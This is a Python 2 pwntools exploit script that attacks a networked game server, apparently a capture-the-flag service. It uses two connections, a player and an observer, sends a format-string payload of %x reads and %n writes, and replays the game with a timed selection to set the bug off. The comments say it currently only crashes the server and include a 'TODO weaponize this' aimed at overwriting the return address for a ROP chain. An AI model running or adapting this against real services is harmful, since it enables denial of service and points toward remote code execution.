#!/usr/bin/env python2

import sys
import time
import pwn

# TODO weaponize this
#
# Currently, this shellcode will only crash the server.  In theory, it
# shouldn't be too bad to use this to overwrite the return address and go to a
# rop chain.
shellcode = \
    "\xff\xff%x%x%x" + \
    "\x01\x01%x%x%x" + \
    "%x%x%x%x%x%x%x" + \
    "%x%x%x%x%x%x%x" + \
    "%x%x%x%x%x%x%x" + \
    "%x%x%x%x%x%x%x" + \
    "%x%x%x%x%x%x%x" + \
    "%n%n%n%n%n%n%n"

moves = "333444422122555500666"

def main():
    if len(sys.argv) != 3:
        print("Usage: ./exploit.py [HOST] [PORT]")
        sys.exit(1)

    host = sys.argv[1];
    port = int(sys.argv[2]);

    print("Creating connections")
    player = pwn.remote(host, port)
    observer = pwn.remote(host, port)

    print("Creating game")
    player.readuntil(">")
    time.sleep(1)
    player.write("0\n")

    print("Writting shellcode")
    player.readuntil(">")
    time.sleep(1)
    player.write(shellcode + "\n")

    print("Creating observer")
    observer.readuntil(">")
    time.sleep(1)
    observer.write("1\n")

    print("Observing game")
    observer.readuntil(">")
    time.sleep(1)
    observer.write("0\n")

    print("Sending in moves")
    for move in moves:
        print("Making move: " + move)
        player.readuntil("> ")
        time.sleep(1)
        player.write(move + "\n")

    print("Replaying the game from the observer")
    observer.readuntil("> ")
    time.sleep(1)
    observer.send("0\n")
    print("Selecting by CPU time")
    observer.readuntil(">")
    observer.send("1\n")
    observer.readuntil("mS -")
    time.sleep(1)
    cputime_str = observer.readuntil(" mS")
    cputime = int(cputime_str[0:-3])
    print("Selected time " + str(cputime))
   
    print("Waiting " + str(33 - (cputime/1000)) + " seconds")
    time.sleep(33 - (cputime/1000))

    print("Sending time selection")
    observer.write(str(cputime - 1) + "\n")   # Send the CPU time that corresponds to the last move

    time.sleep(5)
    player.close()
    observer.close()

main()
